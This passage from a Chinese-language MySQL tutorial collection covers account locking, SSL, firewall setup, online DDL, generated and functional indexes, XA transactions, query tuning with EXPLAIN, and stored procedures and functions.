-- 立即过期（强制用户下次登录修改密码）
ALTER USER 'app_user'@'%' PASSWORD EXPIRE;

-- 永不过期
ALTER USER 'system_user'@'%' PASSWORD EXPIRE NEVER;

-- 修改密码
ALTER USER 'app_user'@'%' IDENTIFIED BY 'NewStrongP@ss2!';
```

### 7.4 账户锁

```sql
-- 创建时锁定账户
CREATE USER 'locked_user'@'%' IDENTIFIED BY 'P@ss123!' ACCOUNT LOCK;

-- 锁定已有账户
ALTER USER 'suspicious_user'@'%' ACCOUNT LOCK;

-- 解锁账户
ALTER USER 'locked_user'@'%' ACCOUNT UNLOCK;

-- 查看账户锁定状态
SELECT user, host, account_locked FROM mysql.user;

-- 登录失败锁定（MySQL 8.0+）
CREATE USER 'app_user'@'%' IDENTIFIED BY 'P@ss123!'
FAILED_LOGIN_ATTEMPTS 3
PASSWORD_LOCK_TIME 1;  -- 失败3次后锁定1天

ALTER USER 'app_user'@'%'
FAILED_LOGIN_ATTEMPTS 5
PASSWORD_LOCK_TIME UNBOUNDED;  -- 永久锁定，需管理员解锁
```

### 7.5 SSL 加密连接

```sql
-- 查看 SSL 配置
SHOW VARIABLES LIKE '%ssl%';

-- 强制用户使用 SSL 连接
CREATE USER 'secure_user'@'%' IDENTIFIED BY 'P@ss123!' REQUIRE SSL;

-- 要求客户端提供有效证书
CREATE USER 'cert_user'@'%' IDENTIFIED BY 'P@ss123!' REQUIRE X509;

-- 指定证书颁发者
ALTER USER 'cert_user'@'%' REQUIRE ISSUER '/C=CN/ST=Beijing/O=MyOrg/CN=MyCA';

-- 指定证书主题
ALTER USER 'cert_user'@'%' REQUIRE SUBJECT '/C=CN/ST=Beijing/O=MyOrg/CN=app_user';

-- 查看 SSL 连接状态
SELECT * FROM performance_schema.threads
WHERE CONNECTION_TYPE = 'SSL/TLS';

-- 查看当前连接的 SSL 信息
STATUS;
-- 或
SHOW SESSION STATUS LIKE 'Ssl%';
```

### 7.6 防火墙插件

```sql
-- 安装 MySQL Enterprise Firewall
INSTALL PLUGIN mysql_firewall SONAME 'mysql_firewall.so';
INSTALL PLUGIN mysql_firewall_users SONAME 'mysql_firewall.so';
INSTALL PLUGIN mysql_firewall_whitelist SONAME 'mysql_firewall.so';

-- 创建防火墙账户
CREATE USER 'fw_admin'@'localhost' IDENTIFIED BY 'FwP@ss123!';
GRANT ALL ON mysql_firewall.* TO 'fw_admin'@'localhost';

-- 注册应用用户的防火墙配置
CALL mysql.sp_set_firewall_mode('app_user@%', 'RECORDING');

-- 应用执行正常查询后，将模式切换为保护模式
CALL mysql.sp_set_firewall_mode('app_user@%', 'PROTECTING');

-- 查看防火墙规则
SELECT * FROM mysql.firewall_whitelist;

-- 查看防火墙拦截记录
SELECT * FROM mysql.firewall_users;
```

## 8. 在线 DDL

### 8.1 在线 DDL 算法

```sql
-- INPLACE：不拷贝全表数据，允许并发 DML（默认优先选择）
ALTER TABLE orders ADD COLUMN remark VARCHAR(200),
ALGORITHM=INPLACE, LOCK=NONE;

-- INSTANT：仅修改元数据，最快（MySQL 8.0.12+）
ALTER TABLE orders ADD COLUMN note VARCHAR(100),
ALGORITHM=INSTANT;

-- COPY：拷贝全表数据，期间锁表
ALTER TABLE orders MODIFY COLUMN amount DECIMAL(15,2),
ALGORITHM=COPY;

-- 查看支持的算法
ALTER TABLE orders ADD COLUMN test_col INT,
ALGORITHM=DEFAULT;  -- 自动选择最优算法
```

### 8.2 INSTANT DDL 支持的操作

```sql
-- 支持 INSTANT 的操作（MySQL 8.0.29+ 扩展）
ALTER TABLE orders ADD COLUMN new_col VARCHAR(50);           -- 添加列（末尾或任意位置）
ALTER TABLE orders DROP COLUMN old_col;                       -- 删除列
ALTER TABLE orders RENAME COLUMN old_name TO new_name;        -- 重命名列
ALTER TABLE orders MODIFY COLUMN status VARCHAR(30);          -- 修改列定义（部分情况）

-- 不支持 INSTANT，需 INPLACE
ALTER TABLE orders ADD INDEX idx_status (status);             -- 添加索引
ALTER TABLE orders DROP INDEX idx_status;                     -- 删除索引
ALTER TABLE orders CHANGE COLUMN old_col new_col INT;         -- 修改列名和类型

-- 监控 DDL 进度
SELECT * FROM performance_schema.setup_instruments
WHERE NAME LIKE 'stage/alter%';

ALTER TABLE large_table ADD COLUMN new_col INT,
ALGORITHM=INPLACE, LOCK=NONE;

-- 另一个会话查看进度
SELECT STAGE, STAGE_INFO, WORK_COMPLETED, WORK_ESTIMATED
FROM performance_schema.events_stages_current
WHERE EVENT_NAME LIKE 'stage/alter%';
```

## 9. 生成列与降序索引

### 9.1 生成列 (Generated Column)

```sql
-- 虚拟生成列：不占用存储空间，查询时计算
CREATE TABLE products (
    id INT PRIMARY KEY,
    name VARCHAR(100),
    price DECIMAL(10, 2),
    discount_rate DECIMAL(3, 2),
    discounted_price DECIMAL(10, 2) AS (price * (1 - discount_rate)) VIRTUAL
);

-- 存储生成列：占用存储空间，插入/更新时计算
CREATE TABLE users (
    id INT PRIMARY KEY,
    first_name VARCHAR(50),
    last_name VARCHAR(50),
    full_name VARCHAR(101) AS (CONCAT(first_name, ' ', last_name)) STORED
);

-- 为生成列创建索引
CREATE INDEX idx_full_name ON users (full_name);

-- 使用生成列简化 JSON 查询
CREATE TABLE events (
    id INT PRIMARY KEY,
    payload JSON,
    event_type VARCHAR(50) AS (JSON_UNQUOTE(payload->'$.type')) STORED,
    event_time DATETIME AS (payload->>'$.timestamp') STORED
);

CREATE INDEX idx_event_type ON events (event_type);
SELECT * FROM events WHERE event_type = 'login';
-- 比直接查询 JSON 路径更高效
```

### 9.2 降序索引

```sql
-- MySQL 8.0+ 真正支持降序索引
CREATE TABLE access_logs (
    id BIGINT PRIMARY KEY,
    user_id INT,
    access_time DATETIME,
    action VARCHAR(50),
    INDEX idx_user_time (user_id ASC, access_time DESC)
);

-- 降序索引优化 ORDER BY DESC 查询
SELECT * FROM access_logs
WHERE user_id = 1001
ORDER BY access_time DESC
LIMIT 50;
-- 使用 idx_user_time 索引，无需 filesort

-- 对比：如果索引是 (user_id, access_time ASC)
-- 上述查询需要反向扫描或 filesort

-- 多列混合排序
CREATE INDEX idx_region_date_amount ON sales (
    region ASC,
    sale_date DESC,
    amount DESC
);

SELECT * FROM sales
WHERE region = 'East'
ORDER BY sale_date DESC, amount DESC
LIMIT 100;
-- 完美匹配降序索引，避免排序
```

## 10. 原子 DDL

### 10.1 原子 DDL 特性

MySQL 8.0 引入原子 DDL，DDL 操作要么完全成功，要么完全回滚，不会留下残留的元数据或文件。

```sql
-- 原子 DDL 示例
CREATE TABLE test_table (
    id INT PRIMARY KEY,
    name VARCHAR(100)
);
-- 如果创建失败（如表已存在），不会留下任何残留

-- 原子 DROP TABLE
DROP TABLE IF EXISTS table1, table2, table3;
-- 要么全部删除，要么都不删除（不会出现删了 table1 但 table2 删除失败的情况）

-- 原子 ALTER TABLE
ALTER TABLE orders
ADD COLUMN new_col VARCHAR(50),
ADD INDEX idx_new_col (new_col);
-- 如果添加索引失败，添加列也会回滚

-- 查看原子 DDL 支持的存储引擎
SELECT ENGINE, SUPPORT FROM information_schema.ENGINES
WHERE ENGINE = 'InnoDB';
```

## 11. XA 分布式事务

### 11.1 XA 事务基础

XA 事务遵循两阶段提交协议（2PC），用于跨多个资源管理器（如多个数据库、消息队列）的分布式事务。

```sql
-- XA 事务语法
-- 阶段1：启动并执行事务
XA START 'txn_001';
UPDATE account_a SET balance = balance - 500 WHERE id = 1;
XA END 'txn_001';

-- 阶段2：准备提交
XA PREPARE 'txn_001';
-- 此时事务已准备好提交，但尚未提交
-- 即使系统崩溃，恢复后也可继续提交

-- 阶段3：提交或回滚
XA COMMIT 'txn_001';   -- 提交
-- 或
XA ROLLBACK 'txn_001'; -- 回滚
```

### 11.2 跨库 XA 事务

```sql
-- 应用层面协调跨库 XA 事务
-- 数据库A：
XA START 'transfer_001';
UPDATE db_a.accounts SET balance = balance - 500 WHERE user_id = 1;
XA END 'transfer_001';
XA PREPARE 'transfer_001';

-- 数据库B：
XA START 'transfer_001';
UPDATE db_b.accounts SET balance = balance + 500 WHERE user_id = 2;
XA END 'transfer_001';
XA PREPARE 'transfer_001';

-- 两个数据库都 PREPARE 成功后，分别提交
-- 数据库A：XA COMMIT 'transfer_001';
-- 数据库B：XA COMMIT 'transfer_001';

-- 如果任一数据库 PREPARE 失败，全部回滚
-- 数据库A：XA ROLLBACK 'transfer_001';
-- 数据库B：XA ROLLBACK 'transfer_001';
```

### 11.3 XA 事务恢复

```sql
-- 查看处于 PREPARE 状态的 XA 事务
XA RECOVER;

-- 输出示例：
-- +----------+-------------+--------------+-----------+
-- | formatID | gtrid_length | bqual_length | data      |
-- +----------+-------------+--------------+-----------+
-- |        1 |           9 |            0 | txn_001   |
-- +----------+-------------+--------------+-----------+

-- 崩溃恢复后提交悬空事务
XA COMMIT 'txn_001';

-- 或回滚悬空事务
XA ROLLBACK 'txn_001';

-- XA 事务监控
SELECT * FROM performance_schema.events_transactions_current
WHERE STATE = 'PREPARED';
```

### 11.4 XA 事务注意事项

```sql
-- XA 事务的限制
-- 1. 不支持嵌套事务
-- 2. PREPARE 后连接断开，事务会保持 PREPARED 状态
-- 3. 长时间 PREPARED 的事务会持有锁，阻塞其他事务

-- 查看长时间 PREPARED 的 XA 事务
XA RECOVER;
-- 检查 data 列中的事务ID，确认是否需要提交或回滚

-- 设置 XA 事务超时（应用层面控制）
-- 建议在应用层设置超时机制，避免事务长时间挂起

-- XA 与复制的兼容性
-- MySQL 5.7+ 支持在复制拓扑中使用 XA 事务
-- 但需要确保 gtid_mode=ON 且 enforce_gtid_consistency=ON
```

## 12. 综合调优检查清单

### 12.1 服务器级别调优

```sql
-- 1. Buffer Pool 命中率 > 99%
SELECT (1 - (SELECT Variable_value FROM performance_schema.global_status
    WHERE Variable_name = 'Innodb_buffer_pool_reads') /
    (SELECT Variable_value FROM performance_schema.global_status
    WHERE Variable_name = 'Innodb_buffer_pool_read_requests')) * 100
    AS buffer_pool_hit_rate;

-- 2. 连接数配置
SHOW VARIABLES LIKE 'max_connections';         -- 最大连接数
SHOW STATUS LIKE 'Threads_connected';           -- 当前连接数
SHOW STATUS LIKE 'Max_used_connections';        -- 历史最大连接数

-- 3. 临时表使用
SHOW STATUS LIKE 'Created_tmp%';
-- Created_tmp_disk_tables / Created_tmp_tables < 5%
-- 过高需增大 tmp_table_size 和 max_heap_table_size

-- 4. 排序效率
SHOW STATUS LIKE 'Sort%';
-- Sort_merge_passes 过高需增大 sort_buffer_size
SET GLOBAL sort_buffer_size = 4194304;  -- 4MB
```

### 12.2 查询级别调优

```sql
-- 1. 定期分析慢查询
SELECT * FROM sys.statements_with_runtimes_in_95th_percentile\G

-- 2. 检查冗余索引
SELECT * FROM sys.schema_redundant_indexes\G

-- 3. 检查未使用索引
SELECT * FROM sys.schema_unused_indexes;

-- 4. 更新表统计信息
ANALYZE TABLE orders, products, customers;

-- 5. 检查表碎片
SELECT TABLE_NAME, DATA_FREE / 1024 / 1024 AS fragment_mb
FROM information_schema.TABLES
WHERE TABLE_SCHEMA = 'app_db' AND DATA_FREE > 0
ORDER BY DATA_FREE DESC;

-- 6. 优化碎片化表
ALTER TABLE orders ENGINE=InnoDB;  -- 重建表，消除碎片
OPTIMIZE TABLE orders;              -- 等价于 ALTER TABLE ... ENGINE=InnoDB
```
## EXPLAIN 执行计划

**基本写法：查看执行计划**
`EXPLAIN <SELECT 语句>;`

```sql
-- 查看查询执行计划
EXPLAIN SELECT * FROM users WHERE age > 18;
```

**基本写法：EXPLAIN 输出连接信息**
`EXPLAIN FORMAT=TREE <SELECT 语句>;`

```sql
-- MySQL 8.0+ 树形输出，显示 join 顺序与成本
EXPLAIN FORMAT=TREE
SELECT u.user_name, o.amount
FROM users u JOIN orders o ON u.id = o.user_id;
```

**基本写法：EXPLAIN ANALYZE 实际执行**
`EXPLAIN ANALYZE <SELECT 语句>;`

```sql
-- MySQL 8.0.18+ 实际执行并统计耗时（注意会真实执行 DML）
EXPLAIN ANALYZE
SELECT COUNT(*) FROM orders WHERE create_time > '2024-01-01';
```

**基本写法：EXPLAIN 语句类型**
`EXPLAIN <语句类型> <SQL 语句>`

```sql
-- 查看 INSERT/UPDATE/DELETE 执行计划
EXPLAIN UPDATE users SET status = 0 WHERE last_login < NOW() - INTERVAL 90 DAY;
EXPLAIN DELETE FROM logs WHERE created_at < '2023-01-01';
```

---

## EXPLAIN 关键列

**基本写法：分析 type 访问类型**
`EXPLAIN SELECT ... -- 关注 type 列`

```sql
-- type 取值从优到差：system > const > eq_ref > ref > range > index > ALL
-- const: 主键或唯一索引等值查询
EXPLAIN SELECT * FROM users WHERE id = 100;
-- range: 索引范围扫描
EXPLAIN SELECT * FROM orders WHERE id BETWEEN 1 AND 100;
```

**基本写法：分析 Extra 额外信息**
`EXPLAIN SELECT ... -- 关注 Extra 列`

```sql
-- Using index: 覆盖索引，无需回表（最优）
EXPLAIN SELECT id, name FROM users WHERE name = '张三';
-- Using filesort: 额外排序（需优化）
EXPLAIN SELECT * FROM users ORDER BY age;
-- Using temporary: 使用临时表（需优化）
EXPLAIN SELECT DISTINCT dept FROM users;
```

---

## SHOW PROFILE

**基本写法：开启 profile**
`SET profiling = 1;`

```sql
-- 启用查询性能分析
SET profiling = 1;
```

**基本写法：查看 profile 列表**
`SHOW PROFILES;`

```sql
-- 查看最近执行的查询及 Query_ID
SHOW PROFILES;
```

**基本写法：查看单条查询详情**
`SHOW PROFILE [CPU|BLOCK IO|ALL] FOR QUERY <Query_ID>;`

```sql
-- 查看指定查询各阶段耗时
SHOW PROFILE CPU FOR QUERY 1;
-- 查看所有资源使用
SHOW PROFILE ALL FOR QUERY 1;
```

---

## 慢查询日志

**基本写法：查看慢查询配置**
`SHOW VARIABLES LIKE 'slow_query_log%';`

```sql
-- 查看慢查询日志开关与路径
SHOW VARIABLES LIKE 'slow_query_log%';
```

**基本写法：开启慢查询日志**
`SET GLOBAL slow_query_log = ON;`

```sql
-- 临时开启慢查询日志
SET GLOBAL slow_query_log = ON;
SET GLOBAL long_query_time = 1;  -- 超过 1 秒记录
```

**基本写法：配置文件持久开启**
`slow_query_log = 1`

```ini
# my.cnf 持久配置
[mysqld]
slow_query_log = 1
slow_query_log_file = /var/log/mysql/slow.log
long_query_time = 1
log_queries_not_using_indexes = 1
```

**基本写法：mysqldumpslow 分析慢日志**
`mysqldumpslow -s <排序字段> -t <行数> <慢日志文件>`

```bash
# 按总耗时排序取前 10 条
mysqldumpslow -s t -t 10 /var/log/mysql/slow.log
# 按次数排序
mysqldumpslow -s c -t 10 /var/log/mysql/slow.log
```

---

## Performance Schema

**基本写法：查看性能 schema 开关**
`SELECT * FROM performance_schema.setup_instruments;`

```sql
-- 查看可用的性能采集器
SELECT name, enabled, timed
FROM performance_schema.setup_instruments
WHERE name LIKE 'statement/%';
```

**基本写法：启用采集器**
`UPDATE performance_schema.setup_instruments SET enabled = 'YES', timed = 'YES' WHERE name LIKE '<模式>';`

```sql
-- 启用语句采集
UPDATE performance_schema.setup_instruments
SET enabled = 'YES', timed = 'YES'
WHERE name LIKE 'statement/%';
```

**基本写法：查看 SQL 执行统计**
`SELECT * FROM performance_schema.events_statements_summary_by_digest ORDER BY COUNT_STAR DESC LIMIT 10;`

```sql
-- 查看执行最频繁的 SQL 模式
SELECT digest_text, count_star, avg_timer_wait/1000000000 AS avg_ms
FROM performance_schema.events_statements_summary_by_digest
ORDER BY count_star DESC LIMIT 10;
```

**基本写法：查看等待事件**
`SELECT * FROM performance_schema.events_waits_summary_global_by_event_name ORDER BY SUM_TIMER_WAIT DESC LIMIT 10;`

```sql
-- 查看最耗时的等待事件
SELECT event_name, count_star, sum_timer_wait/1000000000 AS sum_ms
FROM performance_schema.events_waits_summary_global_by_event_name
ORDER BY sum_timer_wait DESC LIMIT 10;
```

---

## 优化器追踪

**基本写法：开启 optimizer trace**
`SET optimizer_trace = 'enabled=on';`

```sql
-- 启用优化器追踪
SET optimizer_trace = 'enabled=on';
SET optimizer_trace_max_mem_size = 65536;
```

**基本写法：查看追踪结果**
`SELECT * FROM information_schema.OPTIMIZER_TRACE;`

```sql
-- 执行查询后查看优化器决策过程
SELECT id FROM users WHERE email = 'test@example.com';
SELECT trace FROM information_schema.OPTIMIZER_TRACE\G
```

<!-- ============ 文档分隔线：020-mysql/062-FunctionalIndex.md ============ -->

## 1. 函数索引概述

MySQL 8.0 支持函数索引（Functional Index），可以对表达式创建索引，解决索引列使用函数导致索引失效的问题。

## 2. 创建函数索引

```sql
-- 方式1：直接创建函数索引
CREATE INDEX idx_year ON orders ((YEAR(created_at)));

-- 方式2：通过虚拟列创建
ALTER TABLE orders ADD COLUMN order_year INT
    GENERATED ALWAYS AS (YEAR(created_at)) VIRTUAL;
CREATE INDEX idx_order_year ON orders(order_year);
```

## 3. 使用场景

### 3.1 日期函数索引

```sql
-- 优化：WHERE YEAR(created_at) = 2026
CREATE INDEX idx_year ON orders ((YEAR(created_at)));

SELECT * FROM orders WHERE YEAR(created_at) = 2026;
-- 现在可以使用索引
```

### 3.2 字符串函数索引

```sql
-- 优化：WHERE LOWER(email) = 'test@example.com'
CREATE INDEX idx_email_lower ON users ((LOWER(email)));

SELECT * FROM users WHERE LOWER(email) = 'test@example.com';
-- 使用索引
```

### 3.3 JSON 路径索引

```sql
-- 优化：WHERE data->>'$.status' = 'active'
CREATE INDEX idx_data_status ON orders ((CAST(data->>'$.status' AS CHAR(20))));

SELECT * FROM orders WHERE data->>'$.status' = 'active';
-- 使用索引
```

### 3.4 计算列索引

```sql
-- 优化：WHERE price * quantity > 1000
CREATE INDEX idx_total ON order_items ((price * quantity));

SELECT * FROM order_items WHERE price * quantity > 1000;
-- 使用索引
```

## 4. 限制

```sql
-- 函数索引不支持前缀索引
-- 函数索引中的表达式必须用括号包裹
-- 子查询不允许出现在函数索引中
-- 函数索引占用存储空间（虚拟列索引不占数据空间）
```

<!-- ============ 文档分隔线：020-mysql/063-StoredProcedureAndFunction.md ============ -->

## 1. 存储过程基础

### 1.1 什么是存储过程

存储过程是一组预编译的SQL语句集合，存储在数据库中，可通过名称调用执行。

**优势**：

- **性能**：预编译执行，减少网络传输
- **安全**：可控制数据访问权限
- **复用**：封装业务逻辑，多处调用
- **维护**：修改逻辑只需更新存储过程

### 1.2 创建与调用

```sql
-- 创建简单存储过程
DELIMITER //

CREATE PROCEDURE GetAllUsers()
BEGIN
    SELECT id, username, email, created_at
    FROM users
    ORDER BY created_at DESC;
END //

DELIMITER ;

-- 调用存储过程
CALL GetAllUsers();

-- 删除存储过程
DROP PROCEDURE IF EXISTS GetAllUsers;

-- 查看存储过程定义
SHOW CREATE PROCEDURE GetAllUsers;
```

### 1.3 参数类型

```sql
DELIMITER //

-- IN 参数（默认，传入值）
CREATE PROCEDURE GetUserById(IN p_user_id INT)
BEGIN
    SELECT id, username, email
    FROM users
    WHERE id = p_user_id;
END //

-- OUT 参数（返回值）
CREATE PROCEDURE GetUserCount(OUT p_count INT)
BEGIN
    SELECT COUNT(*) INTO p_count FROM users;
END //

-- INOUT 参数（传入并返回）
CREATE PROCEDURE DoubleValue(INOUT p_value INT)
BEGIN
    SET p_value = p_value * 2;
END //

DELIMITER ;

-- 调用带参数的存储过程
CALL GetUserById(1);

-- 调用OUT参数
CALL GetUserCount(@total);
SELECT @total;

-- 调用INOUT参数
SET @num = 10;
CALL DoubleValue(@num);
SELECT @num;  -- 20
```

## 2. 变量与流程控制

### 2.1 变量声明

```sql
DELIMITER //

CREATE PROCEDURE VariableDemo()
BEGIN
    -- 局部变量（用DECLARE声明，有默认值）
    DECLARE v_name VARCHAR(100) DEFAULT 'Unknown';
    DECLARE v_count INT DEFAULT 0;
    DECLARE v_total DECIMAL(10, 2);

    -- 使用SELECT INTO赋值
    SELECT COUNT(*) INTO v_count FROM users;

    -- 使用SET赋值
    SET v_total = v_count * 9.99;

    -- 用户变量（@前缀，会话级别）
    SET @user_var = 'Hello';

    SELECT v_name, v_count, v_total;
END //

DELIMITER ;
```

### 2.2 条件判断

```sql
DELIMITER //

-- IF语句
CREATE PROCEDURE GetDiscount(IN p_amount DECIMAL(10, 2))
BEGIN
    DECLARE v_discount DECIMAL(4, 2);

    IF p_amount >= 1000 THEN
        SET v_discount = 0.20;
    ELSEIF p_amount >= 500 THEN
        SET v_discount = 0.10;
    ELSEIF p_amount >= 100 THEN
        SET v_discount = 0.05;
    ELSE
        SET v_discount = 0.00;
    END IF;

    SELECT p_amount AS original,
           p_amount * (1 - v_discount) AS discounted,
           v_discount AS discount_rate;
END //

-- CASE语句
CREATE PROCEDURE GetShippingCost(IN p_region VARCHAR(50))
BEGIN
    DECLARE v_cost DECIMAL(10, 2);

    CASE p_region
        WHEN 'North' THEN SET v_cost = 10.00;
        WHEN 'South' THEN SET v_cost = 15.00;
        WHEN 'East' THEN SET v_cost = 12.00;
        WHEN 'West' THEN SET v_cost = 12.00;
        ELSE SET v_cost = 20.00;
    END CASE;

    SELECT v_cost AS shipping_cost;
END //

DELIMITER ;
```

### 2.3 循环

```sql
DELIMITER //

-- WHILE循环
CREATE PROCEDURE GenerateNumbers(IN p_count INT)
BEGIN
    DECLARE i INT DEFAULT 1;
    DECLARE result VARCHAR(1000) DEFAULT '';

    WHILE i <= p_count DO
        SET result = CONCAT(result, IF(i > 1, ',', ''), i);
        SET i = i + 1;
    END WHILE;

    SELECT result AS numbers;
END //

-- REPEAT循环（至少执行一次）
CREATE PROCEDURE RepeatDemo(IN p_limit INT)
BEGIN
    DECLARE i INT DEFAULT 1;
    DECLARE total INT DEFAULT 0;

    REPEAT
        SET total = total + i;
        SET i = i + 1;
    UNTIL i > p_limit
    END REPEAT;

    SELECT total AS sum_result;
END //

-- LOOP + LEAVE（类似break）
CREATE PROCEDURE LoopDemo(IN p_limit INT)
BEGIN
    DECLARE i INT DEFAULT 0;
    DECLARE total INT DEFAULT 0;

    add_loop: LOOP
        SET i = i + 1;
        IF i > p_limit THEN
            LEAVE add_loop;  -- 跳出循环
        END IF;
        SET total = total + i;
    END LOOP;

    SELECT total AS sum_result;
END //

-- ITERATE（类似continue）
CREATE PROCEDURE OddSum(IN p_limit INT)
BEGIN
    DECLARE i INT DEFAULT 0;
    DECLARE total INT DEFAULT 0;

    odd_loop: LOOP
        SET i = i + 1;
        IF i > p_limit THEN
            LEAVE odd_loop;
        END IF;
        IF i % 2 = 0 THEN
            ITERATE odd_loop;  -- 跳过偶数
        END IF;
        SET total = total + i;
    END LOOP;

    SELECT total AS odd_sum;
END //

DELIMITER ;
```

## 3. 游标

### 3.1 游标基本用法

```sql
DELIMITER //

CREATE PROCEDURE ProcessUsers()
BEGIN
    -- 声明变量
    DECLARE v_done INT DEFAULT FALSE;
    DECLARE v_id INT;
    DECLARE v_username VARCHAR(50);
    DECLARE v_email VARCHAR(100);

    -- 声明游标
    DECLARE cur CURSOR FOR
        SELECT id, username, email FROM users WHERE status = 'active';

    -- 声明结束处理程序
    DECLARE CONTINUE HANDLER FOR NOT FOUND SET v_done = TRUE;

    -- 打开游标
    OPEN cur;

    -- 循环读取
    read_loop: LOOP
        FETCH cur INTO v_id, v_username, v_email;
        IF v_done THEN
            LEAVE read_loop;
        END IF;

        -- 处理每行数据
        INSERT INTO user_log (user_id, action, created_at)
        VALUES (v_id, CONCAT('Processed user: ', v_username), NOW());
    END LOOP;

    -- 关闭游标
    CLOSE cur;

    SELECT 'Processing complete' AS status;
END //

DELIMITER ;
```

### 3.2 游标与分组统计

```sql
DELIMITER //

CREATE PROCEDURE CategoryStats()
BEGIN
    DECLARE v_done INT DEFAULT FALSE;
    DECLARE v_category VARCHAR(50);
    DECLARE v_count INT;
    DECLARE v_avg_price DECIMAL(10, 2);

    DECLARE cur CURSOR FOR
        SELECT category,
               COUNT(*) AS cnt,
               AVG(price) AS avg_price
        FROM products
        GROUP BY category;

    DECLARE CONTINUE HANDLER FOR NOT FOUND SET v_done = TRUE;

    -- 创建临时结果表
    DROP TEMPORARY TABLE IF EXISTS temp_stats;
    CREATE TEMPORARY TABLE temp_stats (
        category VARCHAR(50),
        product_count INT,
        avg_price DECIMAL(10, 2)
    );

    OPEN cur;

    read_loop: LOOP
        FETCH cur INTO v_category, v_count, v_avg_price;
        IF v_done THEN
            LEAVE read_loop;
        END IF;

        INSERT INTO temp_stats VALUES (v_category, v_count, v_avg_price);
    END LOOP;

    CLOSE cur;

    SELECT * FROM temp_stats;
    DROP TEMPORARY TABLE IF EXISTS temp_stats;
END //

DELIMITER ;
```

## 4. 异常处理

### 4.1 Handler 类型

```sql
DELIMITER //

CREATE PROCEDURE SafeInsertUser(
    IN p_username VARCHAR(50),
    IN p_email VARCHAR(100)
)
BEGIN
    -- 声明异常状态变量
    DECLARE v_error VARCHAR(255) DEFAULT '';

    -- CONTINUE HANDLER: 捕获异常后继续执行
    DECLARE CONTINUE HANDLER FOR SQLEXCEPTION
    BEGIN
        GET DIAGNOSTICS CONDITION 1 v_error = MESSAGE_TEXT;
        SELECT CONCAT('Error: ', v_error) AS error_message;
    END;

    INSERT INTO users (username, email, created_at)
    VALUES (p_username, p_email, NOW());

    IF v_error = '' THEN
        SELECT 'User inserted successfully' AS result;
    END IF;
END //

-- 特定错误码处理
CREATE PROCEDURE SafeTransfer(
    IN p_from_id INT,
    IN p_to_id INT,
    IN p_amount DECIMAL(10, 2)
)
BEGIN
    DECLARE EXIT HANDLER FOR SQLEXCEPTION
    BEGIN
        ROLLBACK;
        SELECT 'Transfer failed, transaction rolled back' AS result;
    END;

    START TRANSACTION;

    UPDATE accounts SET balance = balance - p_amount WHERE id = p_from_id;
    UPDATE accounts SET balance = balance + p_amount WHERE id = p_to_id;

    COMMIT;
    SELECT 'Transfer completed' AS result;
END //

DELIMITER ;
```

## 5. 自定义函数

### 5.1 创建函数

```sql
DELIMITER //

-- 计算订单总金额
CREATE FUNCTION CalculateOrderTotal(p_order_id INT)
RETURNS DECIMAL(12, 2)
DETERMINISTIC
READS SQL DATA
BEGIN
    DECLARE v_total DECIMAL(12, 2);

    SELECT SUM(oi.quantity * oi.unit_price)
    INTO v_total
    FROM order_items oi
    WHERE oi.order_id = p_order_id;

    RETURN IFNULL(v_total, 0);
END //

-- 格式化金额
CREATE FUNCTION FormatCurrency(
    p_amount DECIMAL(12, 2),
    p_currency VARCHAR(3)
)
RETURNS VARCHAR(20)
DETERMINISTIC
BEGIN
    RETURN CONCAT(p_currency, ' ', FORMAT(p_amount, 2));
END //

-- 计算年龄
CREATE FUNCTION CalculateAge(p_birthdate DATE)
RETURNS INT
DETERMINISTIC
BEGIN
    RETURN TIMESTAMPDIFF(YEAR, p_birthdate, CURDATE());
END //

DELIMITER ;

-- 使用自定义函数
SELECT CalculateOrderTotal(1001) AS total;
SELECT FormatCurrency(1234.56, 'CNY') AS formatted;
SELECT name, CalculateAge(birthdate) AS age FROM employees;
```

### 5.2 存储过程 vs 函数

| 特性     | 存储过程        | 函数           |
| :------- | :-------------- | :------------- |
| 返回值   | OUT参数或结果集 | 单个标量值     |
| SQL调用  | CALL            | SELECT中使用   |
| DML操作  | 允许            | 不允许（一般） |
| 事务控制 | 允许            | 不允许         |
| 结果集   | 可返回多个      | 只返回一个值   |

## 6. 常见问题与解决方案

### 6.1 DELIMITER 问题

```sql
-- 问题：在存储过程中使用分号导致提前结束
-- 解决方案：临时更改分隔符

DELIMITER //
CREATE PROCEDURE MyProc()
BEGIN
    -- 这里的分号不会结束CREATE PROCEDURE
    SELECT * FROM users;
END //
DELIMITER ;  -- 恢复默认分隔符
```

### 6.2 游标性能

```sql
-- 问题：大数据量游标处理慢
-- 解决方案：尽量用集合操作替代游标

-- 不推荐：逐行处理
-- 游标循环UPDATE...

-- 推荐：批量操作
UPDATE orders o
JOIN customers c ON o.customer_id = c.id
SET o.discount = CASE
    WHEN c.tier = 'gold' THEN 0.20
    WHEN c.tier = 'silver' THEN 0.10
    ELSE 0.00
END;
```

### 6.3 函数中不能执行DML

```sql
-- 问题：函数中执行INSERT/UPDATE/DELETE报错
-- 解决方案：改用存储过程

-- 函数只能做计算，不能修改数据
-- 如果需要修改数据，使用存储过程
```

## 7. 总结与最佳实践

### 7.1 选择指南

- **简单计算**：用自定义函数，可在SQL中直接调用
- **复杂业务逻辑**：用存储过程，支持事务和DML
- **批量数据处理**：优先用集合操作，游标作为最后手段

### 7.2 最佳实践

1. **命名规范**：存储过程用 `sp_` 前缀，函数用 `fn_` 前缀
2. **参数校验**：在存储过程开头验证输入参数
3. **错误处理**：始终包含异常处理逻辑
4. **避免游标**：能用集合操作就不用游标
5. **添加注释**：存储过程和函数应包含用途说明
6. **权限控制**：通过存储过程控制数据访问，不直接暴露表
## 存储过程基础

**换行写法：创建无参存储过程**
`CREATE PROCEDURE <过程名>() BEGIN <过程体> END`
```sql
-- 创建查询所有用户的存储过程
DELIMITER //
CREATE PROCEDURE GetAllUsers()
BEGIN
    SELECT id, username, email, created_at
    FROM users
    ORDER BY created_at DESC;
END //
DELIMITER ;
```

**单行写法：调用存储过程**
`CALL <过程名>([<参数>...])`
```sql
-- 调用存储过程
CALL GetAllUsers();
```

**单行写法：删除存储过程**
`DROP PROCEDURE [IF EXISTS] <过程名>`
```sql
-- 删除存储过程
DROP PROCEDURE IF EXISTS GetAllUsers;
```

**单行写法：查看存储过程定义**
`SHOW CREATE PROCEDURE <过程名>`
```sql
-- 查看存储过程定义
SHOW CREATE PROCEDURE GetAllUsers;
```

---

## 参数类型

**换行写法：IN 参数**
`IN <参数名> <类型>`
```sql
-- 创建带 IN 输入参数的存储过程
DELIMITER //
CREATE PROCEDURE GetUserById(IN p_user_id INT)
BEGIN
    SELECT id, username, email
    FROM users
    WHERE id = p_user_id;
END //
DELIMITER ;
```

